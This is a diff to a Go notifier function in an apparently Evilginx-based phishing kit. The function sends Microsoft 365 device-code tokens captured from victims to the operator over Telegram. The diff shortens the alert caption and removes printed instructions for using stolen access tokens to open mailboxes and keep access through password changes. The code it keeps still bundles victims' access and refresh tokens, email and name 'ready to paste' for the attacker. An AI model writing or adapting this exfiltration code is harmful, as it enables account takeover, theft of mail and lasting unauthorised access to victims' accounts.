@@ -1070,87 +1070,33 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		userEmail := ""
 		userName := ""
 		provider := ""
-		client := ""
 		if data.Custom != nil {
 			userEmail = data.Custom["dc_user_email"]
 			userName = data.Custom["dc_user_name"]
 			provider = data.Custom["dc_provider"]
-			client = data.Custom["dc_client"]
 		}
 		if provider == "" {
 			provider = data.Phishlet
 		}
+		if userName == "" {
+			userName = userEmail
+		}
 
-		// Build caption for the Telegram message
-		caption := "🎯 DEVICE CODE CAPTURED!\n"
-		caption += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-		caption += fmt.Sprintf("👤 User: %s\n", userName)
-		caption += fmt.Sprintf("📧 Email: %s\n", userEmail)
-		caption += fmt.Sprintf("🔗 Provider: %s\n", provider)
-		caption += fmt.Sprintf("📱 Client: %s\n", client)
-		caption += fmt.Sprintf("🌐 IP: %s\n", data.Origin)
-		caption += fmt.Sprintf("📍 Location: %s, %s %s\n", geoInfo.City, geoInfo.Country, geoInfo.CountryFlag)
-		caption += fmt.Sprintf("🏢 ISP: %s\n", geoInfo.ISP)
-		caption += fmt.Sprintf("⏰ Time: %s\n", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))
-		caption += "✅ Tokens attached as file"
+		// Simple caption
+		caption := fmt.Sprintf("🎯 %s\n📧 %s\n🔗 %s\n⏰ %s",
+			userName, userEmail, provider, time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))
 
-		// Build the .txt file content with tokens only
+		// File content: just the tokens, ready to paste
 		var fileContent strings.Builder
-
-		fileContent.WriteString("═══════════════════════════════════════════════════\n")
-		fileContent.WriteString("  CAPTURED SESSION - " + userEmail + "\n")
-		fileContent.WriteString("  " + time.Now().UTC().Format("2006-01-02 15:04:05 UTC") + "\n")
-		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
-
-		// Section 1: Access Token
-		fileContent.WriteString("═══════════════════════════════════════════════════\n")
-		fileContent.WriteString("  ACCESS TOKEN\n")
-		fileContent.WriteString("  Valid: ~1 hour | Server auto-refreshes every 15 min\n")
-		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
+		fileContent.WriteString("[access_token]\n")
 		if at, ok := data.Custom["dc_access_token"]; ok {
 			fileContent.WriteString(at)
 		}
-		fileContent.WriteString("\n\n")
-
-		// Section 2: Refresh Token
-		fileContent.WriteString("═══════════════════════════════════════════════════\n")
-		fileContent.WriteString("  REFRESH TOKEN\n")
-		fileContent.WriteString("  Valid: 90 days | Survives password changes\n")
-		fileContent.WriteString("  Server auto-refreshes every 15 min\n")
-		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
+		fileContent.WriteString("\n\n[refresh_token]\n")
 		if rt, ok := data.Custom["dc_refresh_token"]; ok {
 			fileContent.WriteString(rt)
 		}
-		fileContent.WriteString("\n\n")
-
-		// Section 3: Device Code + Copy Link
-		fileContent.WriteString("═══════════════════════════════════════════════════\n")
-		fileContent.WriteString("  DEVICE CODE & LINK\n")
-		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
-		if dc, ok := data.Custom["dc_user_code"]; ok && dc != "" {
-			fileContent.WriteString("Device Code: " + dc + "\n")
-		}
-		if link, ok := data.Custom["dc_link"]; ok && link != "" {
-			fileContent.WriteString("Auth Link: " + link + "\n")
-		}
 		fileContent.WriteString("\n")
-
-		// Section 4: Instructions
-		fileContent.WriteString("═══════════════════════════════════════════════════\n")
-		fileContent.WriteString("  HOW TO USE\n")
-		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
-		fileContent.WriteString("METHOD 1 - Mailbox Viewer:\n")
-		fileContent.WriteString("1. Open mailbox.html in browser\n")
-		fileContent.WriteString("2. Paste the ACCESS TOKEN above\n")
-		fileContent.WriteString("3. Full mailbox access immediately\n\n")
-		fileContent.WriteString("METHOD 2 - Token Portal:\n")
-		fileContent.WriteString("1. Run 'sessions <id> portal' in evilginx terminal\n")
-		fileContent.WriteString("2. Open generated URL in browser\n")
-		fileContent.WriteString("3. Full Microsoft 365 access via cookie import\n\n")
-		fileContent.WriteString("NOTES:\n")
-		fileContent.WriteString("• Refresh token valid for 90 days\n")
-		fileContent.WriteString("• Server auto-refreshes tokens every 15 minutes\n")
-		fileContent.WriteString("• Tokens survive password changes\n")
 
 		// Determine filename
 		usernameFile := "session"
